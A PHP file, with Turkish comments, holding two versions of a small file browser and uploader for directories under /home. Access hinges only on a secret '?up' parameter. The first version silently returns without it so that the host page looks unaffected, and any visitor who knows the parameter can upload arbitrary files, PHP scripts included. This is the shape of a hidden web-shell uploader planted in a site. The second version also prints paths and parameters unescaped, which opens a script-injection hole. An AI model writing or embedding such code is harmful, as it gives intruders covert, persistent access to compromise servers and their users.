<?php
// Hangi dizinde olduğumuzu belirliyoruz
$root = '/home'; // Başlangıç dizini
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root;

// Eğer ?up parametresi yoksa, sayfanın geri kalan kısmını etkilemeden çık
if (!isset($_GET['up'])) {
    // HTML içeriğini etkilemek istemiyorsanız, bu kısmı burada bırakıyoruz
    return; // veya die(); kullanabilirsiniz
}

// Güvenlik: Yalnızca belirtilen dizinin altında gezinebilmek için kontrol
if (strpos($current_dir, realpath($root)) !== 0) {
    die('İzin verilmedi!');
}

// Dosya yükleme işlemi
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
    $target_file = $current_dir . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        echo 'Dosya başarıyla yüklendi: ' . basename($_FILES['file']['name']);
    } else {
        echo 'Dosya yüklenemedi!';
    }
}

// Mevcut dizindeki dosyaları ve dizinleri listeliyoruz
$files = scandir($current_dir);

function is_image($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    return in_array($ext, ['jpg', 'jpeg', 'png', 'gif']);
}

// Dizinlerde gezinme bağlantılarını oluşturma
$navigation_links = [];
if ($current_dir != realpath($root)) {
    $navigation_links[] = '<a href="?dir=' . urlencode(dirname($current_dir)) . '&up=' . urlencode($_GET['up']) . '">.. (Üst Dizin)</a>';
}

foreach ($files as $file) {
    if ($file == '.' || $file == '..') continue;
    $file_path = $current_dir . '/' . $file;
    if (is_dir($file_path)) {
        $navigation_links[] = '<a href="?dir=' . urlencode($file_path) . '&up=' . urlencode($_GET['up']) . '">' . htmlspecialchars($file) . '</a>';
    } else {
        $navigation_links[] = htmlspecialchars($file) . (is_image($file) ? ' <img src="' . htmlspecialchars($file_path) . '" style="width:100px;"/>' : '');
    }
}

// Kullanıcıya dosyaları ve dizinleri gösterme
echo "Mevcut Dizin: " . htmlspecialchars($current_dir) . "<br>";
echo "<ul>";
foreach ($navigation_links as $link) {
    echo "<li>$link</li>";
}
echo "</ul>";

// Dosya Yükleme Formu
echo '<h2>Dosya Yükle</h2>';
echo '<form action="" method="post" enctype="multipart/form-data">';
echo '<input type="file" name="file">';
echo '<input type="submit" value="Yükle">';
echo '</form>';
?>

yedek kod 2: 



<?php
// Hangi dizinde olduğumuzu belirliyoruz
$root = '/home'; // Başlangıç dizini
$current_dir = isset($_GET['dir']) ? realpath($_GET['dir']) : $root;

// Güvenlik: Yalnızca belirtilen dizinin altında gezinebilmek için kontrol
if (strpos($current_dir, realpath($root)) !== 0) {
    die('İzin verilmedi!');
}

// Eğer ?up parametresi yoksa çık
if (!isset($_GET['up'])) {
    die('Bu sayfaya erişim için ?up parametresi gereklidir.');
}

// Dosya yükleme işlemi
if ($_SERVER['REQUEST_METHOD'] == 'POST' && isset($_FILES['file'])) {
    $target_file = $current_dir . '/' . basename($_FILES['file']['name']);
    if (move_uploaded_file($_FILES['file']['tmp_name'], $target_file)) {
        echo 'Dosya başarıyla yüklendi: ' . basename($_FILES['file']['name']);
    } else {
        echo 'Dosya yüklenemedi!';
    }
}

// Mevcut dizindeki dosyaları ve dizinleri listeliyoruz
$files = scandir($current_dir);

function is_image($file) {
    $ext = strtolower(pathinfo($file, PATHINFO_EXTENSION));
    return in_array($ext, ['jpg', 'jpeg', 'png', 'gif']);
}
?>

<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>PHP Dosya Yöneticisi</title>
</head>
<body>

<h1>Mevcut Dizin: <?php echo $current_dir; ?></h1>

<!-- Dizinlerde gezinme -->
<ul>
    <?php if ($current_dir != realpath($root)): ?>
        <li><a href="?dir=<?php echo dirname($current_dir); ?>&up=<?php echo isset($_GET['up']) ? $_GET['up'] : ''; ?>">.. (Üst Dizin)</a></li>
    <?php endif; ?>

    <?php foreach ($files as $file): ?>
        <?php if ($file == '.' || $file == '..') continue; ?>
        <?php $file_path = $current_dir . '/' . $file; ?>
        <?php if (is_dir($file_path)): ?>
            <li>[Dizin] <a href="?dir=<?php echo $file_path; ?>&up=<?php echo isset($_GET['up']) ? $_GET['up'] : ''; ?>"><?php echo $file; ?></a></li>
        <?php else: ?>
            <li><?php echo $file; ?> <?php if (is_image($file)) echo ' <img src="' . $file_path . '" style="width:100px;"/>'; ?></li>
        <?php endif; ?>
    <?php endforeach; ?>
</ul>

<!-- Dosya Yükleme Formu -->
<h2>Dosya Yükle</h2>
<form action="" method="post" enctype="multipart/form-data">
    <input type="file" name="file">
    <input type="submit" value="Yükle">
</form>

</body>
</html>
